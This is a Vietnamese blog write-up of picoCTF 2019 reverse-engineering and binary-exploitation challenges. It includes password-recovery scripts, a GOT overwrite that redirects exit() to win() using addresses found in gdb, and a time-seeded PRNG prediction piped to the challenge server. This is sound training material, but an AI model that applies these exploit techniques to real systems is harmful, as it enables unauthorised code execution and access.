---
layout: post
title: "Pico CTF 2019 - Part 2"
categories: [writeup]
---
Writeup này do 1 bạn trong team mình viết về Binary Exploitaton, Reverse Engineering và General Skills. Sau đây mình xin trích dẫn nguyên văn của bạn ấy.


# $ Reverse Engineering 

### [vault-door-6 - Points: 350]
Bài này sử dụng phép tính XOR để check password, trong script java ta có hàm
```java
    public boolean checkPassword(String password) {
        if (password.length() != 32) {
            return false;
        }
        byte[] passBytes = password.getBytes();
        byte[] myBytes = {
            0x3b, 0x65, 0x21, 0xa , 0x38, 0x0 , 0x36, 0x1d,
            0xa , 0x3d, 0x61, 0x27, 0x11, 0x66, 0x27, 0xa ,
            0x21, 0x1d, 0x61, 0x3b, 0xa , 0x2d, 0x65, 0x27,
            0xa , 0x33, 0x6d, 0x64, 0x30, 0x34, 0x37, 0x66,
        };
        for (int i=0; i<32; i++) {
            if (((passBytes[i] ^ 0x55) - myBytes[i]) != 0) {
                return false;
            }
        }
        return true;
    }
```
Tham số password sẽ được chuyển thành các bytes, chỉ cần XOR mỗi byte trong mảng với giá trị **0x55** và lấy kí tự biểu diễn trong mã ASCII là ta đã có được flag: 

```python
bytes_group = [	0x3b, 0x65, 0x21, 0xa , 0x38, 0x0 , 0x36, 0x1d,
            	0xa , 0x3d, 0x61, 0x27, 0x11, 0x66, 0x27, 0xa ,
            	0x21, 0x1d, 0x61, 0x3b, 0xa , 0x2d, 0x65, 0x27,
            	0xa , 0x33, 0x6d, 0x64, 0x30, 0x34, 0x37, 0x66 ]

result = ""

for b in bytes_group:
	result += chr(b^0x55)

print("picoCTF{" + result + "}")
```
Flag: picoCTF{n0t_mUcH_h4rD3r_tH4n_x0r_f81eab3}

### [vault-door-7 - Points: 400]
Vault-door-7 đã hint sẵn trong phần comment:

```java
    // Each character can be represented as a byte value using its
    // ASCII encoding. Each byte contains 8 bits, and an int contains
    // 32 bits, so we can "pack" 4 bytes into a single int. Here's an
    // example: if the hex string is "01ab", then those can be
    // represented as the bytes {0x30, 0x31, 0x61, 0x62}. When those
    // bytes are represented as binary, they are:
    //
    // 0x30: 00110000
    // 0x31: 00110001
    // 0x61: 01100001
    // 0x62: 01100010
    //
    // If we put those 4 binary numbers end to end, we end up with 32
    // bits that can be interpreted as an int.
    //
    // 00110000001100010110000101100010 -> 808542562
    //
    // Since 4 chars can be represented as 1 int, the 32 character password can
    // be represented as an array of 8 ints.
```
Trans: Mỗi kí tự trong input sẽ được chuyển về giá trị tương ứng của nó trong bảng ASCII ( "0" -> "0x30"), cứ mỗi cụm 4 kí tự như thế sẽ gộp thành một dãy nhị phân 32 bits, với 32 bits ta được một giá trị theo kiểu int.
Vậy ta chỉ cần chuyển các giá trị kiểu int trong bài theo hướng ngược lại:

```python
load = [1096770097,
	1952395366,
	1600270708,
	1601398833,
	1716808014,
	1734292281,
	1698182450,
	1684289586,]

result = ""
for chunk in load:
	x1 = (chunk >> 8 * 3) & 0xff 
	x2 = (chunk >> 8 * 2) & 0xff
	x3 = (chunk >> 8 * 1) & 0xff
	x4 = (chunk >> 	8 * 0) & 0xff
	result += chr(x1) + chr(x2) + chr(x3) + chr(x4)

print("picoCTF{" + result + "}")
```
Flag: picoCTF{A_b1t_0f_b1t_sh1fTiNg_39e852dd82}

### [vault-door-8 - Points: 450]
File java của vault-door-8 đã bị obfuscate nhẹ, chỉ cần chỉnh lại một chút ta đã có đoạn code "dễ nhìn" hơn: 

```java
import java.util.*; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec;
import java.security.*; 

class VaultDoor8 {
	public static void main(String args[]) {

		Scanner b = new Scanner(System.in); 
		System.out.print("Enter vault password: ");
		String c = b.next(); 
		String f = c.substring(8,c.length()-1); 
		VaultDoor8 a = new VaultDoor8(); 
		if (a.checkPassword(f)) 
			{System.out.println("Access granted."); }
		else 
			{System.out.println("Access denied!"); } } 

		public char[] scramble(String password) {/* Scramble a password by transposing pairs of bits. */
			char[] a = password.toCharArray(); 
			for (int b=0; b<a.length; b++) {
				char c = a[b]; 
				c = switchBits(c,1,2); 
				c = switchBits(c,0,3);  
				c = switchBits(c,5,6); 
				c = switchBits(c,4,7);
				c = switchBits(c,0,1); 
				c = switchBits(c,3,4); 
				c = switchBits(c,2,5); 
				c = switchBits(c,6,7); 
				a[b] = c; 
			} 
			return a;
		} 

		public char switchBits(char c, int p1, int p2) {
		/* 	Just switch the two bits with index p1 and p2 
		*/ 
			char mask1 = (char)(1 << p1);
			char mask2 = (char)(1 << p2); 
			char bit1 = (char)(c & mask1); 
			char bit2 = (char)(c & mask2); 
			char rest = (char)(c & ~(mask1 | mask2)); 
			char shift = (char)(p2 - p1); 
			char result = (char)((bit1<<shift) | (bit2>>shift) | rest); 
			return result;
		} 

		public boolean checkPassword(String password) {
			char[] scrambled = scramble(password); 
			char[] expected = {	0xF4, 0xC0, 0x97, 0xF0, 
						0x77, 0x97, 0xC0, 0xE4, 
						0xF0, 0x77, 0xA4, 0xD0, 
						0xC5, 0x77, 0xF4, 0x86, 
						0xD0, 0xA5, 0x45, 0x96, 
						0x27, 0xB5, 0x77, 0xD0, 
						0xC2, 0xC0, 0xA5, 0xF1, 
						0xD0, 0xF0, 0xD2, 0x95 }; 
			return Arrays.equals(scrambled, expected); 
		} 
}
```
Hàm **switchBits()** nhìn có vẻ phức tạp nhưng thực ra nó chỉ có nhiệm vụ hoán đổi 2 bits với nhau. Hàm **scramble()** sử dụng **switchBits()** để tráo vị trí một số bits nhất định (như 1-2, 0-3, 5-6,...). Vậy để được kết quả như trong mảng **expected[]** ta chỉ việc làm điều ngược lại:

```python
def switchBits(c, p1, p2):
	mask1 = (1 << p1) & 0xff
	mask2 = (1 << p2) & 0xff 
	bit1 = (c & mask1) & 0xff
	bit2 = (c & mask2) & 0xff
	rest = c & ~(mask1 | mask2); 
	shift = (p2 - p1) & 0xff
	result = ((bit1<<shift) | (bit2>>shift) | rest) & 0xff
	return result	

load = [0xF4, 0xC0, 0x97, 0xF0, 
	0x77, 0x97, 0xC0, 0xE4, 
	0xF0, 0x77, 0xA4, 0xD0, 
	0xC5, 0x77, 0xF4, 0x86, 
	0xD0, 0xA5, 0x45, 0x96, 
	0x27, 0xB5, 0x77, 0xD0, 
	0xC2, 0xC0, 0xA5, 0xF1, 
	0xD0, 0xF0, 0xD2, 0x95 ]

for i in range(len(load)):
	c = load[i]
	c = switchBits(c,6,7)
	c = switchBits(c,2,5)
	c = switchBits(c,3,4)
	c = switchBits(c,0,1)
	c = switchBits(c,4,7)
	c = switchBits(c,5,6)
	c = switchBits(c,0,3)
	c = switchBits(c,1,2)
	load[i] = chr(c)

print("picoCTF{" + "".join(load) +"}")
```
Flag: picoCTF{s0m3_m0r3_b1t_sh1fTiNg_180f7139e}

### [Time's Up - Points: 400]
Times-up yêu cầu ta phải viết một script để tương tác với chương trình. Cụ thể, khi chạy **times_up** ta có output:

```
Challenge: (((((-1585525032) + (-1315337490)) + ((-1210687722) + (-1712677562))) + (((1574472192) - (-206120176)) + ((1474679296) + (1086821368)))) + ((((1448663555) + (430583224)) + ((501613922) - (1433228152))) - (((1295444858) - (2122044640)) - ((980926300) + (1824548434)))))
Setting alarm...
Solution?
```
Một biểu thức cộng trừ dài ngoằng được random, trong khi đó chương trình chỉ cho ta 5s để giải, chỉ còn cách là viết script thôi.

```python
import subprocess
import sys

if len(sys.argv) == 2:
	progname = sys.argv[1]

	proc = subprocess.Popen(progname, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

	print("Interacting with %s..." % progname)

	while True:
		calculated = 0
		res = ((proc.stdout.readline()).decode('utf-8')).split("\n")
		
		if len(res) > 1:
			print("Received: %s with length %d" % (res, len(res)))
		# 
		if res[0].startswith("Challenge"):
			expr = res[0][10:]
			print("Expression received: ", expr)
			
			calculated = str(eval(expr)).encode('utf-8')
			print("Calculated: %d", calculated)
			
			proc.stdin.write(calculated)
			# Finish the communication with flag as final message
			print(proc.communicate()[0])
			break
		else:
			proc.stdin.write(''.encode('utf-8'))
```
Cách đơn giản nhất là chạy chương trình C ngay trong python sử dụng module [subprocess](https://docs.python.org/3/library/subprocess.html).
Output của script:
 ```
$ python3 /tmp/times_up.py "./times-up"
Interacting with ./times-up...
Received: ['Challenge: (((((-1541800575) + (1938598600)) + ((1809545404) + (954768912))) + (((-8514865) - (-2144335592)) + ((-649088962) + (2103215626)))) + ((((1478687736) + (146498644)) + ((1689687228) + (-1812283516))) + (((-984224752) + (-1445576292)) - ((-2020076480) + (1382747600)))))', ''] with length 2
Expression received:   (((((-1541800575) + (1938598600)) + ((1809545404) + (954768912))) + (((-8514865) - (-2144335592)) + ((-649088962) + (2103215626)))) + ((((1478687736) + (146498644)) + ((1689687228) + (-1812283516))) + (((-984224752) + (-1445576292)) - ((-2020076480) + (1382747600)))))
Calculated: %d b'6461177660'
b'picoCTF{Gotta go fast. Gotta go FAST. #3daa579a}\nSolution? Congrats! Here is the flag!\n'

 ```
 ### [reverse_cipher - Points: 300]
 Thử truy cập vào thư mục của chương trình trên shell ta thấy có 3 files:
 ```
$ ls
flag.txt  rev  rev_this
$ ./rev
-bash: ./rev: Permission denied
$ cat rev_this
picoCTF{w1{1wq87g_9654g}
$ cat flag.txt9bfdf6
cat: flag.txt: Permission denied
 ```
 Chỉ có file rev_this là đọc được, mà dãy đấy cũng chẳng phải là flag :((.
 Thử mổ xẻ nó bằng [Ghidra](https://ghidra-sre.org/) xem nào!
 Hàm main sau khi được decompiled sẽ ra đọan code:
 ```C
void main(void) {
  FILE *flag;
  FILE *revStream;
  size_t flagLength;
  char flagBuffer [23];
  char local_41;
  FILE *rev;
  FILE *flag_file;
  uint idx;
  int index;
  char chr;
  
  flag = fopen("flag.txt","r");
  revStream = fopen("rev_this","a");
  if (flag == (FILE *)0x0) {
    puts("No flag found, please make sure this is run on the server");
  }
  if (revStream == (FILE *)0x0) {
    puts("please run this on the server");
  }
  flagLength = fread(flagBuffer,0x18,1,flag);
  if ((int)flagLength < 1) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  index = 0;
  while (index < 8) {
    fputc((int)flagBuffer[(long)index],revStream);
    index = index + 1;
  }
  idx = 8;
  while ((int)idx < 0x17) {
    if ((idx & 1) == 0) {
      chr = flagBuffer[(long)(int)idx] + 5;
    }
    else {
      chr = flagBuffer[(long)(int)idx] + -2;
    }
    fputc((int)chr,revStream);
    idx = idx + 1;
  }
  fputc((int)local_41,revStream);
  fclose(revStream);
  fclose(flag);
  return;
}
 ```
 Dán mắt đọc một lúc ta nhận ra chương trình chỉ đơn giản là đọc file **rev_this** copy 8 kí tự đầu ("picoCTF{") vào file flag và sau đó tiếp tục decode **rev_this**: nếu index là số chẵn thì cộng 5, lẻ thì trừ đi 2.

Viết một script nho nhỏ để decode:

```python
rev = "w1{1wq8/8/8b8`j"
flag = [char for char in rev]

for idx in range(len(flag)):
	c = ord(flag[idx])
	if idx & 0x1 == 0:
		c -= 5
	else:
		c += 2
	flag[idx] = chr(c)

print("picoCTF{" + "".join(flag) + "}")
```
Flag: picoCTF{r3v3rs31313d3be}
 # $ Binary Exploitation
 ### [GoT - Points: 350]
 Để tạo và chạy chương trình, cần có một vài công đoạn:
 Compiling -> Assembling -> Linking -> Loading

 **GOT ( Global offset Table)** (not Game of Thrones): hiểu nôm na GOT là một bảng chứa địa chỉ các hàm trong thư viện (printf(), scanf(), puts(), exit(), bla bla).
 
 **Dynamic linking**: Một công đoạn linking, trong đó các hàm trong thư viện chỉ được liên kết (link) với file thực thi khi ta chạy file đó. 
 Một file thực thi có thể được tạo bằng 2 cách, static linking hoặc dynamic linking.
 Với static linking: các hàm sẽ được ghi vào trong file thực thi.
 Với dynamic linking: địa chỉ các hàm sẽ được lưu vào plt và got, để khi ta chạy chương trình **loader** sẽ thực hiện liên kết các hàm trong thư viện với với file thực thi trong bộ nhớ ảo (virtual address).
```
           +--------------+                              +-------------------+
           |              |                              |                   |
           |Static Linking|                              |  Dynamic Linking  |
           |              +----------+      +------------+                   |
           +--------------+          |      |            +-------------------++
                                     |      |                                 |
                                     |      |                                 |
                                     |      |                                 |
+-------------+    +------------+  +-+------+---+  +------------+             |
|             |    |            |  |            |  |            |             |
|   Compiling +--->+ Assembling +--> Linking    +-->  Loading   |             |
|             |    |            |  |            |  |            |             |
+-------------+    +------------+  +------------+  +------------+             |
                                                                              |
                   +-----------------------+    +------------------------+    |
                   | Global Offset Table   |    |Procedure Linkage Table |    |
                   |      (GOT)            +<---+      (PLT)             +----+
                   +-----------------------+    +------------------------+
                   +-----------------------+    |  Unresolved functions  |
                   |scanf(): something     |    |scanf():...             |
                   |puts(): something      |    |puts():...              |
                   |exit(): something      |    |exit():...              |
                   |...                    |    |...                     |
                   +-----------------------+    +------------------------+

```
 
Xem source code trước đã:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define FLAG_BUFFER 128

void win() {
  char buf[FLAG_BUFFER];
  FILE *f = fopen("flag.txt","r");
  fgets(buf,FLAG_BUFFER,f);
  puts(buf);
  fflush(stdout);
}


int *pointer;

int main(int argc, char *argv[])
{
  
   puts("You can just overwrite an address, what can you do?\n");
   puts("Input address\n");
   scanf("%d",&pointer);
   puts("Input value?\n");
   scanf("%d",pointer);
   puts("The following line should print the flag\n");
   exit(0);
}
```
Không quá khó để thấy dụng ý của hàm **main**: yêu cầu ta cung cấp một **địa chỉ** và **giá trị** để ghi đè ở địa chỉ đó (biến pointer). Hmm... chỉ cần ghi đè một hàm nào đó trong chương trình bằng địa chỉ của **win()** là được rồi!
Ta có 3 hàm **puts()**, **scanf()** và **exit()** để overwrite nhưng ở đây ta chỉ có thể ghi đè **exit()**.
#### Tại sao lại là exit()?
Bước dynamic linking được áp dụng với từng hàm trong lần đầu tiên ta gọi hàm đó, hàm được link sẽ ghi vào bảng PLT, đến lần gọi thứ 2 trở đi chương trình không cần trỏ qua GOT để lấy offset của hàm nữa.
Do chỉ sau khi gọi **scanf()** và **puts()** địa chỉ của biến pointer mới được set nên ta không thể overwrite **scanf()** và **puts()** được nữa nên chỉ còn hàm **exit()** là chưa được gọi thôi.
#### Lấy địa chỉ
```
$ gdb vuln
(gdb) br main
Breakpoint 1 at 0x804866e
(gdb) x win
0x80485c6 <win>:	0x53e58955
(gdb) disass exit
Dump of assembler code for function exit@plt:
   0x08048460 <+0>:	jmp    *0x804a01c
   0x08048466 <+6>:	push   $0x20
   0x0804846b <+11>:	jmp    0x8048410
End of assembler dump.
```
Địa chỉ của win():  0x080485c6 -> 134514118
Địa chỉ của exit() trong PLT/GOT: 0x804a01c -> 134520860
#### Overwrite
```
./vuln
You can just overwrite an address, what can you do?

Input address

134520860
Input value?

134514118
The following line should print the flag

picoCTF{A_s0ng_0f_1C3_and_f1r3_92b89b47}
```

### [seed-sPRiNG - Points: 350]
Decomiled code seed-spring bằng [Ghidra](https://ghidra-sre.org)
```c
  seed = time((time_t *)0x0);
  srand(seed);
  index = 1;
  while( true ) {
    if (0x1e < index) {
      puts("Congratulation! You\'ve won! Here is your flag:\n");
      get_flag();
      fflush(stdout);
      return 0;
    }
    printf("LEVEL (%d/30)\n",index);
    puts("");
    randVal = rand();
    printf("Guess the height: ");
    fflush(stdout);
    __isoc99_scanf(&format,&guessVal);
    fflush(stdin);
    if ((randVal & 0xf) != guessVal) break;
    index = index + 1;
  }
  puts("WRONG! Sorry, better luck next time!");
  fflush(stdout);
  ```
Chương trình yêu cầu ta đoán giá trị được random 30 lần.
Lỗi chương trình ở đây là việc sử dụng **seed** cho hàm **srand()** để khởi tạo chuỗi random, **seed** được dùng ở đây là thời gian trong hệ thống chương trình. Lấy được **seed** thì ta có thể tạo ra chuỗi số random giống hệt như chương trình.
```c
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

int main(int argc, char** argv) {
	int i, result;
	time_t seed = time(0) + (argc > 1 ? atoi(argv[0]) : 0);
	srand(seed);
	for (i = 0; i < 30; i++) {
		result = (int) rand() & 0xf;
		printf("%d\n", result);
	}
	return 0;
}
```
Để đảm bảo lấy được thời gian hệ thống giống với chương trình, ta tạo và chạy luôn chương trình trong server.
```
$ vim /tmp/sync.c
$ gcc -o /tmp/sync /tmp/sync.c
$ /tmp/sync | nc 2019shell1.picoctf.com 21871


                                                                             
                          #                mmmmm  mmmmm    "    mm   m   mmm 
  mmm    mmm    mmm    mmm#          mmm   #   "# #   "# mmm    #"m  # m"   "
 #   "  #"  #  #"  #  #" "#         #   "  #mmm#" #mmmm"   #    # #m # #   mm
  """m  #""""  #""""  #   #          """m  #      #   "m   #    #  # # #    #
 "mmm"  "#mm"  "#mm"  "#m##         "mmm"  #      #    " mm#mm  #   ##  "mmm"
                                                                             


Welcome! The game is easy: you jump on a sPRiNG.
How high will you fly?

LEVEL (1/30)

Guess the height: LEVEL (2/30)

...

Guess the height: LEVEL (30/30)

Guess the height: picoCTF{pseudo_random_number_generator_not_so_random_454fbf9b8595fa66a87547e520351217}Congratulation! You've won! Here is your flag:
```

